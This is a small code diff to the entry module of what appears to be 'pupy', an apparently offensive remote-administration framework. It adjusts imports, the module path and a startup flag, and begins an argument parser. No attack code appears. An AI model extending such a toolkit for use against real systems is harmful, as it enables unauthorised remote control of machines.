@@ -1,12 +1,18 @@
 # -*- coding: utf-8 -*-
 
 import argparse
+import sys
+import os
 
 from . import main
 
-from network.conf import launchers, load_network_modules
+setattr(sys, '__pupy_main__', True)
 
-load_network_modules()
+sys.path.append(os.path.dirname(os.path.dirname(__file__)))
+
+import pupylib
+
+from network.conf import launchers
 
 parser = argparse.ArgumentParser('pupy')
 parser.add_argument('--debug', action='store_true', default=False, help='Enable debug')
